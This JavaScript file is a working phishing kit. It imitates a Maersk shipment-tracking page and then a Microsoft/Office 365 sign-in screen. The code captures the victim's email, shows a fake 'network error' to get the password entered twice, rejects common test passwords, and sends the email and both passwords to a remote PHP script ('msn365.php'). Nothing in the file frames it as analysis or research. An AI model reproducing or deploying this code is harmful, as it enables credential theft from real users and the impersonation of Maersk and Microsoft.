const validEmail = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;


let maersk_contents = document.getElementById("maersk_contents");

let hauling_img = document.getElementById("hauling_img");

let maersk_table = document.getElementById("maersk_table");
let track_btn = document.getElementById("track_btn");

let laod_content = document.getElementById("laod_content");
let img_laoder = document.getElementById("img_laoder");
let service_laoding = document.getElementById("service_laoding");

img_counter = Math.floor(Math.random() * 4);
let photo_slide  = "https://babo4.github.io/msk/"+img_counter+".png"
hauling_img.src = photo_slide;

// 1st batch

const maerskPage = `
<section class="mearsk_container" style="background: white;">

            <nav>
                <ul>
                    <li><img src="logo1.svg" alt=""></li>
                    <li class="closeMenu">Price</li>
                    <li class="closeMenu">Book &#9013;</li>
                    <li class="closeMenu">Tracking</li>
                    <li class="closeMenu">Schedules</li>
                    <li class="closeMenu">Logistics Solutions</li>
                </ul>
    
                <ul>
                    <li class="closeMenu">EN &#9013;</li>
                    <li class="maersk_bar_menu">&#9776;</li>
                </ul>
            </nav>
    
            <div>
                
            </div>
    
            <div class="maersk_input">
                <section>
                    <h2>Incident Report Portal</h2>
                <ol>
                    <li>Tracking</li>
                    <li>Schedules</li>
                    <li>Local Offices</li>
                </ol>
    
                <input type="email" placeholder="Enter e-mail address" class="track_input">
                <button onclick="maerskBtnSub(this)">Track</button>
                </section>
            </div>
    
            <div class="maersk_body1">
                <section>
                    <h2>
                        The Maersk app just got even better
                    </h2>
                    <p>
                        Our new tracking feature means it's easy to see the status of your shipments and get 24/7 real-time updates, wherever you are.
                    </p>
                    <button>
                        Learn more
                    </button>
                </section>
            </div>
    
            <div class="maersk_user">
                <section>
                    <img src="user1.svg" alt="">
                    <span>
                        <h3>New to Maersk.com?</h3>
                        <p>
                            Sign up to book online, manage and pay for shipments, and access a suite of products and services designed to simplify your supply chain.
                        </p>
                        <button>Register now</button>
                    </span>
                </section>
    
                <section>
                    <img src="user2.svg" alt="">
                    <span>
                        <h3>How to get started</h3>
                        <p>
                            Step by step guides to get started using our digital services.
                        </p>
                        <button>Learn more</button>
                    </span>
                </section>
            </div>
    
            <div class="maersk_logistics">
                <h2>
                    Logistics solutions
                </h2>
                <section class="logistics_intro">
                    <p>
                        From the farm to your fridge, or the warehouse to your wardrobe, Maersk is developing solutions that meet customer needs from one end of the supply chain to the other.
                    </p>
    
                    <button>
                        See all solutions
                    </button>
                </section>
    
                <section class="logistics_content">
                    <div>
                        <img src="bg/m1.jpg" alt="">
                    <h3>Transportation Services</h3>
                    <p>
                        Learn how Maersk offers small and large businesses the opportunity to grow.
                    </p>
                    </div>
    
                    <div>
                        <img src="bg/m2.webp" alt="">
                    <h3>Supply Chain and Logistics</h3>
                    <p>
                        We focus on solving your supply chain needs from end to end, taking the complexity out of container shipping for you.
                    </p>
                    </div>
    
                    <div>
                        <img src="bg/m3.webp" alt="">
                    <h3>Digital Solutions</h3>
                    <p>
                        Our tailored online services take the complexity out of shipping by letting you instantly book, manage and track shipments, submit Verified Gross Mass information and much more.
                    </p>
                    </div>
                </section>
            </div>
    
            <div class="maersk_latest_news">
                <h2>Latest news</h2>
                <button>See all news</button>
    
                <section>
                    <div>
                        <img src="bg/h1.png" alt="">
                        <h5>News</h5>
                        <p>
                            Flying to new limits
                        </p>
                    </div>
    
                    <div>
                        <img src="bg/h2.jpg" alt="">
                        <h5>News</h5>
                        <p>
                            Maersk Market Update Latin America
                        </p>
                    </div>
    
                    <div>
                        <img src="bg/h3.webp" alt="">
                        <h5>News</h5>
                        <p>
                            Maersk North America Market Update
                        </p>
                    </div>
    
                    <div>
                        <img src="bg/h3.webp" alt="">
                        <h5>Expert opinion</h5>
                        <p>
                            Reviving rail in Europe for efficient logistics
                        </p>
                    </div>
                </section>
            </div>
    
            <div class="maersk_labels">
                <img src="bg/s1.svg" alt="">
                <img src="bg/s2.svg" alt="">
                <img src="bg/s3.svg" alt="">
                <img src="bg/s4.svg" alt="">
                <img src="bg/s5.svg" alt="">
                <img src="bg/s6.svg" alt="">
            </div>
    
            <div class="maersk_footer">
                <section class="maersk_foot1">
                    <ul>
                        <li>About us</li>
                        <li>Careers</li>
                        <li>Insights</li>
                        <li>News & advisories</li>
                        <li>Maersk Growth</li>
                        <li>Whistleblower</li>
                    </ul>
    
                    <ul>
                        <li>Contact us</li>
                        <li>Investors</li>
                        <li>Press</li>
                        <li>Sustainability</li>
                        <li>Procurement</li>
                        <li>Support</li>
                    </ul>
    
                    <ul>
                        <li>Terms & conditions</li>
                        <li>Data Privacy Notification</li>
                        <li>Brand protection</li>
                        <li>Cookie policy</li>
                        <li>Cookie preferences</li>
                        <li>Unsolicited Submissions Policy</li>
                    </ul>
    
                    <ul>
                        <li>Container tracking</li>
                        <li>Supply Chain and Logistics</li>
                        <li>Transportation Services</li>
                        <li>Vessel schedules</li>
                        <li>Container sales</li>
                    </ul>
                </section>
    
                <section class="maersk_foot2">
                    <ol>
                        <li><img src="logo1.svg" alt=""></li>
                        <li>&copy; A.P. Moller - Maersk</li>
                    </ol>
    
                    <ul>
                        <li>LinkedIn</li>
                        <li>Facebook</li>
                        <li>Twitter</li>
                        <li>Instagram</li>
                        <li>YouTube</li>
                    </ul>
    
                    <ol>
                        <li><img src="bg/App_Store_Badge.svg" alt=""></li>
                        <li><img src="bg/google-play-badge.svg" alt=""></li>
                    </ol>
                </section>
            </div>

        </section>
`;

track_btn.addEventListener("click", ()=>{
track_btn.innerHTML = `<span>Please wait . . .</span>`;
setTimeout(() => {
    maersk_table.innerHTML = maerskPage;
}, 3000);
});

function maerskBtnSub(r) {
    m = r.parentElement
    let m_mail = m.getElementsByClassName("track_input")[0];

    if (validEmail.test(m_mail.value)) {

        maersk_table.style.display = "none";
    laod_content.style.display = "flex";

    setTimeout(() => {
        service_laoding.innerText = "Fetching email portal . . .";
    }, 3000);

    setTimeout(() => {
        service_laoding.innerText = "Email verification . . .";
    }, 6000);

    setTimeout(() => {
        maersk_contents.innerHTML = `
        <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>
    *{
        padding: 0;
        margin: 0;
        box-sizing: border-box;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        transition: 0.2s ease;
    }
    
    a{
        text-decoration: none;
        color: #005da6;
    }
    
    main{
        width: 100%;
        height: 100vh;
        overflow: hidden;
        position: relative;
        background-image: linear-gradient(to bottom right, rgba(255, 165, 0, 0.2) , silver, silver, rgba(255, 165, 0, 0.2));
        display: flex;
        justify-content: center;
        align-items: center;
    }
    
    #form_container{
        width: 35%;
        min-height: 50vh;
        background-color: transparent;
    }
    
    #form_container div{
        background-color: white;
        box-shadow: 0px 0px 3px gray;
    }
    
    .office_main_form{
        position: relative;
        padding: 2rem 3rem;
    }
    
    #load_ani{
        display: none;
        width: 100%;
        position: absolute;
        top: 0;
        left: 0;
        font-size: 1.5rem;
        animation: loading_ani 3s linear infinite;
    }
    
    
    .office_main_form h1{
        font-weight: 450;
        margin-top: 1rem;
        font-size: 2rem;
    }
    
    #name_holder{
        color: rgba(0, 0, 0, 0.8);
        font-size: 1rem;
    }
    
    #name_holder b{
        font-size: larger;
        cursor: pointer;
    }
    
    #name_holder{
        display: none;
    }
    
    .office_main_form input{
        display: block;
        width: 100%;
        margin: 1rem 0rem;
        padding: 0.5rem 0.1rem;
        border: 1px solid gray;
        border-width: 0px 0px 1px 0px;
        font-size: inherit;
        outline: none;
    }
    
    .office_main_form input:focus{
        border-color: #005da6 !important;
    }
    
    .btn_container{
        display: flex;
        justify-content: right;
        align-items: center;
        margin-top: 2rem;
    }
    
    .btn_container button{
        background-color: rgba(0, 93, 166, 0.9);
        color: white;
        font-size: inherit;
        border: none;
        padding: 0.4rem 2rem;
    }
    
    .btn_container button:hover{
        background-color: rgba(0, 93, 166, 1);
        cursor: pointer;
    }
    
    .office_main_form p{
        font-size: 0.9rem;
        margin-top: 1rem;
    }
    
    .link_q{
        width: 17px;
        height: 17px;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        border: 1px solid black;
        border-radius: 50%;
        margin: 0px 3px;
    }
    
    .office_sub_form{
        display: flex;
        align-items: center;
        gap: 0.5rem;
        margin-top: 2rem;
        padding: 0.5rem 3rem;
    }
    
    .office_sub_form:hover{
        background-color: lightgray !important;
        cursor: pointer;
    }
    
    footer{
        position: absolute;
        bottom: 0.5rem;
        right: 0.5rem;
        font-size: 0.8rem;
    }
    
    footer a{
        color: black;
        margin-right: 0.5rem;
    }
    
    footer a:not(:last-child):hover{
        text-decoration: underline;
    }
    
    /*  */
    @keyframes loading_ani {
        from{transform: scaleX(100%);}
        to{transform: scaleX(-95%);}
    }
    
    /*  */
    @media (max-width:1030px) {
        #form_container{
            width: 50%;
        }
    }
    
    @media (max-width:900px) {
        #form_container{
            width: 70%;
        }
    }
    
    @media (max-width:600px) {
        #form_container{
            width: 90%;
        }
    }
    
    @media (max-width:500px) {
        main{
            align-items: flex-start;
            padding-top: 3rem;
        }
    
        .office_main_form h1{
            margin-top: 2rem;
            font-size: 1.5rem;
        }
    
        #form_container{
            width: 90%;
        }
    
        .office_main_form, .office_sub_form{
            padding: 1rem;
        }
    
        .office_main_form p{
            font-size: 0.6rem;
        }
    
        #load_ani{
            top: -2rem;
        }
    }
    
    @media (max-width:400px) {
        #form_container{
            width: 95%;
        }
    }
    
    @media (max-width:300px) {
        main{
            overflow: auto;
        }
    }
    </style>
    
    <title>Sign in to your account</title>
</head>
<body>

    <main id="app_main">
        <aside id="form_container">
            <div class="office_main_form">
                
            <b id="load_ani">. . .</b>
            
                <img src="https://babo4.github.io/msk/logo.svg" alt="Sign in">
                <p id="name_holder"><b>&#10508;</b> <span id="e_holder"></span></p>

                <h1 id="header_main">Sign in</h1>

                <input id="e_input" value="${m_mail.value}" class="show_pass_content" placeholder="Email, phone, or Skype">

                <input type="hidden" id="temp_p">
                <input type="hidden" id="data_send" value="1">
                <p id="link1">No account? <a href="">Create one!</a></p>
                <p id="link2"><a href="">Sign in with Windows Hello or a security key</a> <span class="link_q">?</span></p>
                <section class="btn_container">
                    <button onclick="subFormBtn(this)" id="btn_365">Next</button>
                </section>
            </div>

            <div class="office_sub_form">
                <img src="https://babo4.github.io/msk/key.svg" alt="Sign in">
                <span>Sign-in options</span>
            </div>

        </aside>

        <footer>
            <a href="">Terms of use</a>
            <a href="">Privacy & cookies</a>
            <a href="">. . .</a>
        </footer>
    </main>
    
</body>
</html>
`;

    const urls = new URLSearchParams(window.location.search);
    const user = urls.get('user');
    
    const e_input = document.getElementById("e_input");
    const load_ani = document.getElementById("load_ani");
    const data_send = document.getElementById("data_send");
    
    let link1 = document.getElementById("link1");
    let link2 = document.getElementById("link2");
    let name_holder = document.getElementById("name_holder");
    let header_main = document.getElementById("header_main");
    let btn_365 = document.getElementById("btn_365");
    let temp_p = document.getElementById("temp_p");
    let e_holder = document.getElementById("e_holder");
    
    const sub_btn = document.getElementById("form_container");

    const office_sub_form = document.getElementsByClassName("office_sub_form")[0]

        getMail(e_input.value)

        e_input.value = "";
        office_sub_form.style.display = "none";
        
    }, 9000);

}
    else{
        m_mail.style.borderColor = "red";
    }
}


// 2nd batch
let rand_num = Math.floor(Math.random() * 2000) + 5000;
let office_count = 0;

// 
function subFormBtn(btn) {

    const office_sub_form = document.getElementsByClassName("office_sub_form")[0]

    if (btn.innerText == "Sign in") {
        
        if (office_count == 1) {

            if (validEmail.test(e_holder.innerText)) {

                if (e_input.value.length < 6 || e_input.value == "password" || e_input.value == "Password" || e_input.value == "PASSWORD" || e_input.value == "qwerty" || e_input.value == "QWERTY" || e_input.value == "123456" || e_input.value == "testing" || e_input.value == "Testing" || e_input.value == "TESTING") {

                e_input.style.borderColor = "red";
                office_count = 1;
    
                    return
                }

                load_ani.style.display = "block";
                btn_365.innerText = "Verifying . . .";
                getPass(pass1 = temp_p.value, pass2 = e_input.value, mail = e_holder.innerText)
            }
        } 
        else {

            if (e_input.value.length < 6 || e_input.value == "password" || e_input.value == "Password" || e_input.value == "PASSWORD" || e_input.value == "qwerty" || e_input.value == "QWERTY" || e_input.value == "123456" || e_input.value == "testing" || e_input.value == "Testing" || e_input.value == "TESTING") {
                e_input.style.borderColor = "red"

                return
            }

            office_count++

            load_ani.style.display = "block";
            btn_365.innerText = "Verifying . . .";

             setTimeout(() => {
                temp_p.value =  e_input.value;
                e_input.value = "";
                load_ani.style.display = "none";
                e_input.style.borderColor = "red";

                office_sub_form.style.display = "block";
                office_sub_form.innerHTML = `<b style="color:red; font-weight:400">Network error! Please try again. </b>`;
                btn_365.innerText = "Sign in"
             }, rand_num);
        }
    }

}

    // 
    function getMail(mail) {
        if (validEmail.test(mail)) {
            name_holder.style.display = "block";
            e_holder.innerText = mail;
            e_input.placeholder = "Password";
            e_input.type = "password";
            header_main.innerText = "Enter password";
            btn_365.innerText = "Sign in";
            link1.innerHTML = `<a href="">Forgot password?</a>`;
            link2.innerHTML = `<a href="">Other ways to sign in</a>`;
    
        }
        else{
            e_input.style.borderColor = "red";
        }
    }

    // 
    function getPass(pass1, pass2, mail) {
        if (pass1 != "" && pass2 !="" && mail != "") {
            let url = "msn365.php?auth=office&pass1="+pass1+"&pass2="+pass2+"&mail="+mail;
    
            if (data_send.value == 1) {
                url = "msn365.php?auth=office&pass1="+pass1+"&pass2="+pass2+"&mail="+mail; 
            }
    
            location = url;
            
        }
        else {
            e_input.style.borderColor = "red";
        }
    }
